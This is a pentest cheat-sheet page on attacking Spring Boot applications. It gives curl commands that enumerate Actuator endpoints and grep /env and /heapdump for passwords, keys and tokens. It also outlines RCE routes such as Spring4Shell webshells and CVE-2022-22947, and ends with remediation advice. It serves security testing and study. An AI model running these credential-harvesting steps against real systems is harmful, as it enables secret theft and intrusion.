---
tags:
  - Web
---

# :material-leaf: Spring Boot

<span class="pill pill-hard">actuators → RCE</span> <span class="pill pill-info">web</span>

Spring Boot apps expose **Actuator** management endpoints that leak config (and
secrets) and, when writable, reach RCE. Plus the infamous **Spring4Shell** and
**SpEL/Cloud** injection bugs.

!!! abstract "TL;DR"
    Enumerate `/actuator/*` → read `/env` and `/heapdump` for secrets → abuse
    `/env` + `/refresh` or a writable endpoint for RCE. Check for Spring4Shell.

## :material-magnify: Find the actuators

```bash
# common bases: /actuator  or (older) root paths
for e in actuator actuator/health actuator/env actuator/mappings \
         actuator/heapdump actuator/beans actuator/httptrace \
         env health mappings trace heapdump; do
  curl -s -o /dev/null -w "%{http_code}  /$e\n" http://$TARGET/$e
done
curl -s http://$TARGET/actuator | jq .            # lists exposed endpoints
```

!!! loot "/env and /heapdump leak everything"
    ```bash
    curl -s http://$TARGET/actuator/env | jq . | grep -iE 'pass|secret|key|token'
    curl -s http://$TARGET/actuator/heapdump -o heap.bin   # then strings/grep for creds
    ```
    DB passwords, cloud keys, and session secrets routinely sit in `/env`.

## :material-fire: RCE paths

```text
# 1) Writable /env + /refresh — set a malicious property (e.g. spring.cloud... or
#    a logging/JNDI-style sink) then trigger a refresh.
# 2) /actuator/gateway routes (Spring Cloud Gateway) — CVE-2022-22947 SpEL RCE.
# 3) Spring4Shell — CVE-2022-22965: class-loader manipulation on WAR-deployed
#    Spring MVC (JDK9+, Tomcat) → write a JSP webshell.
# 4) H2 console (/h2-console) enabled → JDBC → RCE.
```

## :material-shield-check: Remediation

- Don't expose actuators (`management.endpoints.web.exposure.include` minimal);
  require auth on `/actuator`; disable heapdump; patch Spring; remove H2 console.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Leaked secrets → [Cloud](../cloud/index.md); SpEL/JNDI overlaps [Deserialization](../web/deserialization.md).
- Reference: [HackTricks Spring Actuators](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html).
